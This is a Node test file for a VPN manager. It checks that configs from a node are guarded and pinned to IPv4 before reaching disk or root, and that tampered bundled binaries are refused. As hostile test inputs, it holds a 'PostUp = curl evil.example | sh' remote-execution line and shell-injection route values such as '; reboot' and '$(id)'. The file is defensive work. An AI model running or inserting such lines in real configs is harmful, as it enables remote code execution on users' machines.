import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { EventEmitter } from 'node:events'
import { chmodSync, copyFileSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { loadModule, type ModuleHarness } from '../../../test/harness/module.ts'
import { read } from '../../../test/harness/source.ts'

// vpn-manager is where node-supplied config meets root and the user's process table.
// These pin the order at its sinks (docs/invariants/node-trust.md [NT-1],
// reliability.md [REL-7], packaging.md [PKG-1]): pin the endpoint, guard the config,
// and only then write it or hand it to root; a bundled binary that fails its pin is
// refused, never swapped for whatever is on PATH.

const vm = await loadModule({
  entries: ['src/main/vpn/vpn-manager.ts'],
  fake: ['src/main/helper/privileged'],
  stubs: { child_process: 'test/harness/child-process.ts' },
})

// wg-quick and v2ray "installed": executables in a temp dir put first on PATH.
const bin = mkdtempSync(join(tmpdir(), 'kv-bin-'))
const resources = mkdtempSync(join(tmpdir(), 'kv-resources-'))
const savedPath = process.env.PATH
const ownTmp = new Set(readdirSync(tmpdir()))
before(() => {
  for (const name of ['wg-quick', 'v2ray', 'xray', 'hysteria']) {
    writeFileSync(join(bin, name), '#!/bin/sh\n')
    chmodSync(join(bin, name), 0o755)
  }
  process.env.PATH = `${bin}:${savedPath}`
  ;(process as { resourcesPath?: string }).resourcesPath = resources
})
after(() => {
  process.env.PATH = savedPath
  rmSync(bin, { recursive: true, force: true })
  rmSync(resources, { recursive: true, force: true })
  // vpn-manager makes its own private temp dir at import, once per fresh instance.
  for (const d of readdirSync(tmpdir())) if (d.startsWith('katacomb-vpn-') && !ownTmp.has(d)) rmSync(join(tmpdir(), d), { recursive: true, force: true })
})

const CLEAN_WG = (endpoint: string) => [
  '[Interface]', 'PrivateKey = aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd28=', 'Address = 10.8.0.2/32', '',
  '[Peer]', 'PublicKey = aGVsbG8gd29ybGQgaGVsbG8gd29ybGQgaGVsbG8gd28=', 'AllowedIPs = 0.0.0.0/0', `Endpoint = ${endpoint}`, '',
].join('\n')

/** A spawned core as far as vpn-manager looks at one; no pid, so nothing is tracked in /proc. */
function fakeChild(): EventEmitter {
  return Object.assign(new EventEmitter(), { pid: undefined, exitCode: null, stdout: new EventEmitter(), stderr: new EventEmitter(), kill: () => true })
}

/** The katacomb-vpn-* temp dirs that exist now. */
const ourDirs = () => readdirSync(tmpdir()).filter((d) => d.startsWith('katacomb-vpn-'))

function fresh(opts: { spawn?: boolean; execSync?: (cmd: string) => unknown } = {}): ModuleHarness & { privileged: string[][]; secureTmp: string } {
  const privileged: string[][] = []
  const before = new Set(ourDirs())
  const h = vm.fresh({
    'helper/privileged': { runPrivileged: async (a: string[]) => { privileged.push(a) } },
    child_process: {
      // No interface exists yet; getent resolves wg.example to a documentation address.
      execSync: opts.execSync ?? (() => { throw new Error('Device "sntl0" does not exist.') }),
      execFileSync: (cmd: string, args: string[]) => {
        if (cmd === 'getent' && args[1] === 'wg.example') return Buffer.from('198.51.100.5    STREAM wg.example\n')
        throw new Error(`unexpected ${cmd}`)
      },
      spawn: () => {
        if (!opts.spawn) throw new Error('nothing may be spawned in this test')
        return fakeChild()
      },
    },
  })
  // The private dir this instance made at import: where its configs would be written.
  const [secureTmp] = ourDirs().filter((d) => !before.has(d))
  return Object.assign(h, { privileged, secureTmp: join(tmpdir(), secureTmp) })
}

type Connect = (cfg: string, ...rest: unknown[]) => unknown

test('[NT-1] a WireGuard config the guard rejects never reaches root or the disk', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  const evil = CLEAN_WG('203.0.113.7:51820').replace('[Peer]', 'PostUp = curl evil.example | sh\n\n[Peer]')
  await assert.rejects(async () => (h.mod.connectWireGuardFromConfig as Connect)(evil))
  assert.deepEqual(h.privileged, [])
  assert.deepEqual(readdirSync(h.secureTmp), [], 'the rejected config was never written')
})

test('[REL-7] [NT-1] control: a clean config is pinned to IPv4 first, then written 0600 and handed to root', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  await (h.mod.connectWireGuardFromConfig as Connect)(CLEAN_WG('wg.example:51820'))
  assert.equal(h.privileged.length, 1)
  const [verb, file] = h.privileged[0]
  assert.equal(verb, 'up')
  assert.match(readFileSync(file, 'utf-8'), /^Endpoint = 198\.51\.100\.5:51820$/m, 'root sees the pinned IP, never the hostname')
  assert.equal(statSync(file).mode & 0o777, 0o600)
})

test('[NT-1] a V2Ray config the guard rejects is never written or spawned', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  // A SOCKS inbound on every interface would open the user's tunnel to the LAN.
  const cfg = JSON.stringify({
    inbounds: [{ protocol: 'socks', listen: '0.0.0.0', port: 1080 }],
    outbounds: [{ protocol: 'vmess', settings: { vnext: [{ address: '203.0.113.7', port: 443 }] } }],
  })
  await assert.rejects(async () => (h.mod.connectV2RayFromConfig as Connect)(cfg))
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
})

test('[PKG-1] a bundled core that fails its pin is refused, never swapped for the one on PATH', async (t) => {
  mkdirSync(join(resources, 'linux/bin'), { recursive: true })
  writeFileSync(join(resources, 'linux/bin/v2ray'), 'tampered')
  t.after(() => rmSync(join(resources, 'linux'), { recursive: true, force: true }))
  const h = fresh()
  t.after(() => h.dispose())
  await assert.rejects(async () => (h.mod.connectV2RayFromConfig as Connect)('{}'), /integrity/)
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
})

// The other three sinks: AmneziaWG is handed to root, Xray and Hysteria2 are
// spawned as the user. The same order holds at each: pin, guard, then write.

const corpus = (name: string) => read(`daemon/internal/guard/testdata/corpus/${name}`)
const CLEAN_AWG = (endpoint: string) => corpus('amneziawg/clean.conf').replace('Endpoint = 203.0.113.10:51820', `Endpoint = ${endpoint}`)
const CLEAN_XRAY = (address: string) => JSON.stringify({
  inbounds: [{ protocol: 'socks', listen: '127.0.0.1', port: 1080 }],
  outbounds: [{ protocol: 'vless', settings: { vnext: [{ address, port: 443 }] } }, { protocol: 'freedom' }],
})
const CLEAN_HY2 = (server: string) => JSON.stringify({
  server,
  auth: '11111111-2222-3333-4444-555555555555',
  tls: { insecure: true, pinSHA256: 'b3:7a:2f:9c:1d:44:e8:05:6a:cc:91:0f:23:5e:88:d1:47:b0:9a:3c:6e:12:fd:84:55:aa:e1:38:7c:90:2b:6f' },
  socks5: { listen: '127.0.0.1:1080' },
  lazy: true,
})
const written = (h: ModuleHarness, i = 0) => {
  const args = h.world.calls('child_process', 'spawn')[i].args[1] as string[]
  return readFileSync(args[args.indexOf('-c') + 1], 'utf-8')
}

test('[NT-1] an AmneziaWG config the guard rejects never reaches root or the disk', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  const evil = CLEAN_AWG('203.0.113.7:51820').replace('[Peer]', 'PostUp = curl evil.example | sh\n\n[Peer]')
  await assert.rejects(async () => (h.mod.connectAmneziaWgFromConfig as Connect)(evil), /not allowed/)
  assert.deepEqual(h.privileged, [])
  assert.deepEqual(readdirSync(h.secureTmp), [])
})

test('[REL-7] [NT-1] control: a clean AmneziaWG config is pinned to IPv4, then written 0600 and handed to root', async (t) => {
  const h = fresh()
  t.after(() => h.dispose())
  await (h.mod.connectAmneziaWgFromConfig as Connect)(CLEAN_AWG('wg.example:51820'))
  assert.equal(h.privileged.length, 1)
  const [verb, file] = h.privileged[0]
  assert.equal(verb, 'awg-up')
  assert.match(readFileSync(file, 'utf-8'), /^Endpoint = 198\.51\.100\.5:51820$/m)
  assert.equal(statSync(file).mode & 0o777, 0o600)
})

test('[NT-1] an Xray config the guard rejects is never spawned', async (t) => {
  const h = fresh({ spawn: true })
  t.after(() => h.dispose())
  const evil = CLEAN_XRAY('203.0.113.7').replace('"listen":"127.0.0.1"', '"listen":"0.0.0.0"')
  await assert.rejects(async () => (h.mod.connectXRayFromConfig as Connect)(evil), /loopback|listen|not allowed/i)
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
})

test('[REL-7] [NT-1] control: a clean Xray config is pinned to IPv4 before xray is spawned on it', async (t) => {
  const h = fresh({ spawn: true })
  t.after(() => h.dispose())
  await (h.mod.connectXRayFromConfig as Connect)(CLEAN_XRAY('wg.example'))
  const cfg = JSON.parse(written(h)) as { outbounds: Array<{ settings?: { vnext?: Array<{ address: string }> } }> }
  assert.equal(cfg.outbounds[0].settings?.vnext?.[0].address, '198.51.100.5', 'xray never re-resolves the node through its own tunnel')
})

test('[NT-1] a Hysteria2 config the guard rejects is never spawned', async (t) => {
  const h = fresh({ spawn: true })
  t.after(() => h.dispose())
  const evil = CLEAN_HY2('203.0.113.7:34567').replace('127.0.0.1:1080', '0.0.0.0:1080')
  await assert.rejects(async () => (h.mod.connectHysteria2FromConfig as Connect)(evil), /loopback/)
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
})

test('[REL-7] [NT-1] control: a clean Hysteria2 config is pinned to IPv4 before hysteria is spawned on it', async (t) => {
  const h = fresh({ spawn: true })
  t.after(() => h.dispose())
  await (h.mod.connectHysteria2FromConfig as Connect)(CLEAN_HY2('wg.example:34567'))
  assert.equal((JSON.parse(written(h)) as { server: string }).server, '198.51.100.5:34567')
})

test('[NT-1] split-tunnel routes reach root only as the guard passes them: tun-up never carries a hostile entry', async (t) => {
  let tun = false
  const h = fresh({
    spawn: true,
    execSync: (cmd: string) => {
      if (cmd === 'ip route show default') return Buffer.from('default via 192.168.1.1 dev eth0 proto dhcp metric 100\n')
      if (cmd === 'ip link show sntl-tun' && tun) return Buffer.from('')
      throw new Error(`Device does not exist (${cmd})`)
    },
  })
  t.after(() => h.dispose())
  writeFileSync(join(h.world.userData, 'settings.json'), JSON.stringify({
    splitTunnelRoutes: ['192.168.50.0/24', '10.0.0.0/8 ; reboot', '$(id)', '1.2.3.4/33', '172.16.0.0/12,0.0.0.0/0'],
  }))
  await (h.mod.connectV2RayFromConfig as Connect)(CLEAN_XRAY('203.0.113.7'))
  const up = (h.mod.bringUpV2RayTunnel as () => Promise<void>)()
  tun = true
  await up
  assert.equal(h.privileged.length, 1)
  const argv = h.privileged[0]
  assert.deepEqual(argv.slice(0, 6), ['tun-up', '-', '127.0.0.1:1080', '203.0.113.7', '192.168.1.1', 'eth0'])
  assert.equal(argv[6], '192.168.50.0/24', 'only the well-formed CIDR crosses into root')
})

test('[REL-18] [PRO-7] a live core is not a tunnel: tunnel mode reads connected only once tun2socks is up, proxy mode at once', async (t) => {
  let tun = false
  const exec = (cmd: string) => {
    if (cmd === 'ip link show sntl-tun' && tun) return Buffer.from('')
    throw new Error(`Device does not exist (${cmd})`)
  }
  const status = (h: ModuleHarness) => (h.mod.getConnectionStatus as () => { connected: boolean; proxyMode: boolean })()

  const tunnel = fresh({ spawn: true, execSync: exec })
  t.after(() => tunnel.dispose())
  await (tunnel.mod.connectV2RayFromConfig as Connect)(CLEAN_XRAY('203.0.113.7'))
  assert.equal(tunnel.mod.isProxyChildAlive(), true, 'the core survived startup')
  assert.equal(status(tunnel).connected, false, 'but the polkit dialog for tun-up is still open: traffic leaves by the NIC')
  tun = true
  assert.equal(status(tunnel).connected, true)

  tun = false
  const proxy = fresh({ spawn: true, execSync: exec })
  t.after(() => proxy.dispose())
  await (proxy.mod.connectV2RayFromConfig as Connect)(CLEAN_XRAY('203.0.113.7'), null, { proxyOnly: true })
  assert.deepEqual([status(proxy).connected, status(proxy).proxyMode], [true, true], 'in proxy mode the core is the whole connection')
  assert.equal(proxy.mod.isVpnActive(), false, 'but no system traffic is redirected, so chain reads must not fall back to the cache')
})

// Windows (docs/windows.md): the same sinks in the same order, with what Windows lacks
// replaced. No `ip`, no getent and no wg-quick: anything exec'd here is a bug, so
// child_process answers spawn alone. Adapter presence comes from Node's interface list,
// lookups from Node's resolver, and the rest from the service, faked here as one that
// adds and removes our adapters as its ops arrive.

const vmWin = await loadModule({
  entries: ['src/main/vpn/vpn-manager.ts'],
  fake: ['src/main/helper/privileged', 'src/main/helper/daemon-client'],
  stubs: {
    child_process: 'test/harness/child-process.ts', os: 'test/harness/os.ts',
    'dns/promises': 'test/harness/dns-promises.ts', 'src/main/platform': 'test/harness/platform-windows.ts',
  },
})

type Route = { gateway: string; iface: string } | null

/**
 * Each Windows test brings its own cores on PATH and its own resources dir: registered
 * after a top-level await, they cannot lean on the file's before/after hooks. `path` ''
 * is a PATH with nothing on it, wg-quick included.
 */
function winMachine(t: test.TestContext, { path }: { path?: string } = {}): { resources: string } {
  const dir = mkdtempSync(join(tmpdir(), 'kv-winbin-'))
  for (const name of ['v2ray', 'xray', 'hysteria']) {
    writeFileSync(join(dir, name), '#!/bin/sh\n')
    chmodSync(join(dir, name), 0o755)
  }
  const res = mkdtempSync(join(tmpdir(), 'kv-winres-'))
  const saved = { path: process.env.PATH, resources: (process as { resourcesPath?: string }).resourcesPath }
  process.env.PATH = path ?? `${dir}:${saved.path}`
  ;(process as { resourcesPath?: string }).resourcesPath = res
  t.after(() => {
    process.env.PATH = saved.path
    ;(process as { resourcesPath?: string }).resourcesPath = saved.resources
    rmSync(dir, { recursive: true, force: true })
    rmSync(res, { recursive: true, force: true })
  })
  return { resources: res }
}

function freshWin(opts: { resolves?: boolean } = {}) {
  const privileged: string[][] = []
  const adapters = new Set<string>()
  const state = { route: { gateway: '192.168.1.1', iface: '12' } as Route, resolves: opts.resolves ?? true }
  const before = new Set(ourDirs())
  const h = vmWin.fresh({
    'helper/privileged': {
      runPrivileged: async (a: string[]) => {
        privileged.push(a)
        if (a[0] === 'up' || a[0] === 'awg-up') adapters.add('sntl0')
        if (a[0] === 'down' || a[0] === 'awg-down') adapters.delete('sntl0')
        if (a[0] === 'tun-up') adapters.add('sntl-tun')
        if (a[0] === 'tun-down') adapters.delete('sntl-tun')
      },
    },
    'helper/daemon-client': {
      daemonDefaultRoute: async () => state.route,
      daemonTrafficCounters: async (iface: string) => (adapters.has(iface) ? { rx: 4096, tx: 512 } : null),
      daemonOtherVpns: async () => ['Mullvad'],
    },
    child_process: { spawn: () => fakeChild() },
    os: { networkInterfaces: () => Object.fromEntries([...adapters].map((name) => [name, []])) },
    dns: {
      lookup: async (host: string, o: { family: number }) => {
        assert.equal(o.family, 4)
        if (state.resolves && host === 'wg.example') return { address: '198.51.100.5', family: 4 }
        throw new Error(`getaddrinfo ENOTFOUND ${host}`)
      },
    },
  })
  const [secureTmp] = ourDirs().filter((d) => !before.has(d))
  return Object.assign(h, { privileged, adapters, state, secureTmp: join(tmpdir(), secureTmp) })
}

const execs = (h: ModuleHarness) => h.world.calls('child_process').filter((c) => c.fn !== 'spawn')

test('[REL-7] [NT-1] Windows: a WireGuard endpoint is looked up ahead, pinned to IPv4, then written and handed to the service', async (t) => {
  winMachine(t, { path: '' }) // no wg-quick anywhere: Windows does not need one
  const h = freshWin()
  t.after(() => h.dispose())
  await (h.mod.connectWireGuardFromConfig as Connect)(CLEAN_WG('wg.example:51820'))
  assert.deepEqual(h.world.calls('dns', 'lookup').map((c) => c.args[0]), ['wg.example'])
  const [verb, file] = h.privileged[0]
  assert.equal(verb, 'up')
  assert.match(readFileSync(file, 'utf-8'), /^Endpoint = 198\.51\.100\.5:51820$/m, 'the service sees the pinned IP, never the hostname')
  assert.deepEqual(execs(h), [])
})

test('[REL-7] Windows: with DNS blocked (the kill switch, before the tunnel), the last good answer still pins the endpoint', async (t) => {
  winMachine(t)
  const h = freshWin()
  t.after(() => h.dispose())
  await (h.mod.connectAmneziaWgFromConfig as Connect)(CLEAN_AWG('wg.example:51820'))
  await (h.mod.disconnect as () => Promise<void>)()
  h.state.resolves = false
  await (h.mod.connectAmneziaWgFromConfig as Connect)(CLEAN_AWG('wg.example:51820'))
  const last = h.privileged.filter((a) => a[0] === 'awg-up').at(-1)!
  assert.match(readFileSync(last[1], 'utf-8'), /^Endpoint = 198\.51\.100\.5:51820$/m)
})

// The cores below are the PATH ones in the temp bin (no win/bin here), as in the Linux tests.
test('[REL-7] [NT-1] Windows: Xray and Hysteria2 node hosts are looked up ahead and pinned before the core is spawned', async (t) => {
  winMachine(t)
  const h = freshWin()
  t.after(() => h.dispose())
  await (h.mod.connectXRayFromConfig as Connect)(CLEAN_XRAY('wg.example'))
  const xray = JSON.parse(written(h, 0)) as { outbounds: Array<{ settings?: { vnext?: Array<{ address: string }> } }> }
  assert.equal(xray.outbounds[0].settings?.vnext?.[0].address, '198.51.100.5')
  await (h.mod.disconnect as () => Promise<void>)()
  await (h.mod.connectHysteria2FromConfig as Connect)(CLEAN_HY2('wg.example:34567'))
  assert.equal((JSON.parse(written(h, 1)) as { server: string }).server, '198.51.100.5:34567')
  assert.deepEqual(h.world.calls('dns', 'lookup').map((c) => c.args[0]), ['wg.example', 'wg.example'])
  assert.deepEqual(execs(h), [])
})

test('[PKG-1] Windows: a core is the .exe under win/bin, checked against its own pin, never the Linux one or PATH', async (t) => {
  const { resources } = winMachine(t)
  // The Linux core beside it must not stand in for the Windows one, nor the one on PATH.
  mkdirSync(join(resources, 'linux/bin'), { recursive: true })
  writeFileSync(join(resources, 'linux/bin/v2ray'), 'linux core')
  mkdirSync(join(resources, 'win/bin'), { recursive: true })
  writeFileSync(join(resources, 'win/bin/v2ray.exe'), 'MZ not pinned')
  const h = freshWin()
  t.after(() => h.dispose())
  // A v2ray.exe that is not the pinned one is refused; neither the Linux core beside it
  // nor the v2ray on PATH is tried instead.
  await assert.rejects(async () => (h.mod.connectV2RayFromConfig as Connect)(CLEAN_XRAY('203.0.113.7')), /Bundled binary v2ray failed SHA-256 integrity check/)
  assert.deepEqual(h.world.calls('child_process', 'spawn'), [])
  // Control: the vendored xray.exe passes its pin and is the one spawned, with no console window.
  copyFileSync('resources/win/bin/xray.exe', join(resources, 'win/bin/xray.exe'))
  await (h.mod.connectXRayFromConfig as Connect)(CLEAN_XRAY('203.0.113.7'))
  const [spawned] = h.world.calls('child_process', 'spawn')
  assert.equal(spawned.args[0], join(resources, 'win/bin/xray.exe'))
  assert.equal((spawned.args[2] as { windowsHide?: boolean }).windowsHide, true)
})

test('Windows: WireGuard needs no wg-quick, and AmneziaWG nothing on the user side', (t) => {
  winMachine(t, { path: '' })
  const h = freshWin()
  t.after(() => h.dispose())
  assert.equal((h.mod.protocolRuntimeError as (p: string) => string | null)('wireguard'), null)
  assert.equal((h.mod.protocolRuntimeError as (p: string) => string | null)('amneziawg'), null)
})

test('Windows: adapters come from the interface list, counters and other VPNs from the service, and nothing is exec\'d', async (t) => {
  winMachine(t)
  const h = freshWin()
  t.after(() => h.dispose())
  assert.equal(h.mod.isVpnActive(), false)
  assert.equal(await (h.mod.readTunnelBytes as () => Promise<unknown>)(), null, 'no adapter: no tunnel, the service is not asked')
  assert.deepEqual(h.world.calls('helper/daemon-client', 'daemonTrafficCounters'), [])
  h.adapters.add('sntl-tun')
  assert.equal(h.mod.isVpnActive(), true)
  assert.deepEqual(await (h.mod.readTunnelBytes as () => Promise<unknown>)(), { rx: 4096, tx: 512 })
  assert.deepEqual(h.world.calls('helper/daemon-client', 'daemonTrafficCounters').map((c) => c.args), [['sntl-tun']])
  assert.deepEqual(await (h.mod.detectOtherVpn as () => Promise<unknown>)(), [{ type: 'tun', name: 'Mullvad', iface: 'Mullvad' }])
  assert.deepEqual(execs(h), [])
})

test('[REL-45] Windows: a WireGuard bring-up records the uplink its endpoint is pinned to; a change is seen, a teardown forgets it', async (t) => {
  winMachine(t)
  const h = freshWin()
  t.after(() => h.dispose())
  const changed = () => (h.mod.hasDefaultRouteChanged as () => Promise<boolean>)()
  await (h.mod.connectWireGuardFromConfig as Connect)(CLEAN_WG('203.0.113.7:51820'))
  assert.equal(await changed(), false)
  h.state.route = { gateway: '10.0.0.1', iface: '7' } // Wi-Fi to wired
  assert.equal(await changed(), true)
  h.state.route = null
  assert.equal(await changed(), false, 'a route that cannot be read never tears a tunnel down')
  h.state.route = { gateway: '10.0.0.1', iface: '7' }
  await (h.mod.disconnect as () => Promise<void>)()
  assert.equal(await changed(), false, 'no tunnel, nothing to compare')
})

test('Windows: tun-up carries the default route the service reported, and the tunnel is up once its adapter is', async (t) => {
  winMachine(t)
  const h = freshWin()
  t.after(() => h.dispose())
  await (h.mod.connectXRayFromConfig as Connect)(CLEAN_XRAY('203.0.113.7'))
  assert.equal(h.mod.isVpnActive(), false, 'a core alone redirects nothing')
  await (h.mod.bringUpV2RayTunnel as () => Promise<void>)()
  assert.deepEqual(h.privileged[0].slice(0, 6), ['tun-up', '-', '127.0.0.1:1080', '203.0.113.7', '192.168.1.1', '12'])
  assert.equal(h.mod.isVpnActive(), true)
  assert.deepEqual(execs(h), [])
})
